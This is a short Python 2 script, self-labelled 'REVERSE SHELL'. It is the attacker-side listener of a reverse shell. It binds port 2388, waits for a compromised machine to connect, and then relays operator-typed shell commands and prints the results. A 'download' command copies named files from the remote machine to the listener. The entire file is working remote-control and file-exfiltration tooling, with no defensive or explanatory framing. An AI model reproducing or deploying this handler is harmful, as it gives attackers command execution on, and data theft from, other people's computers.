import socket
import os
import sys
import time

# creating socket

def create_socket():
    try:
        global ip
        global port
        global s

        ip =''
        port = 2388

        print 'creating socket ...'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print 'socket created successfully ...'

    except socket.error as m :
        print 'socket creation error %s' %(str(m))

    return

# binding


def binding():
    try:
        global ip
        global port
        global s

      ########################
        print ' binding socket to port %s | ' %(str(port))
        s.bind((ip,port))

        print ' listening ...'
        s.listen(5)
    except socket.error as m:
        print 'socket binding error ... %s' %(str(m))
        print ' retrying ...'
        binding()
    return

# accepting

def accepting():
    global conn
    (conn, (ip,port)) = s.accept()

    print ' successful connection with address: %s | port: %s' %(str(ip),str(port))
    send_commands(conn)
    conn.close()
    return

# sending commands and receiving results

def send_commands(conn):
   #################################
    cmd = raw_input('[shell] >>>')

    flag = True

    while flag:
        if cmd.lower() == 'quit':
            conn.close()
            s.close()
            #######################
            sys.exit()
            flag =False


        ## --------------------------------------

        if 'download' in cmd:
            download(cmd)

        ## --------------------------------------


        if len(cmd) > 0:
          ############################
            cmd = cmd.encode()
            conn.send(cmd)
            client_response = conn.recv(2048)
          ###########################################
            print str.decode(client_response,'utf-8')

            send_commands(conn)
    return


def download(cmd):
    conn.send(str.encode(cmd))
    filename = str.decode(cmd[9:])
    l = conn.recv(2048)
    wf = open(filename,'w')

    while len(l) > 0:
        wf.write(l)
        l = conn.recv(2048)
    print 'file received correctly ...'
    wf.close()
    conn.close()
    #s.close()
    time.sleep(5)
    main()

    return


# main function

def main():
    print '::::: REVERSE SHELL :::::'

    #creating socket
    create_socket()

    #socket Binding
    binding()

    # accepting
    accepting()

if __name__ == '__main__':
    main()



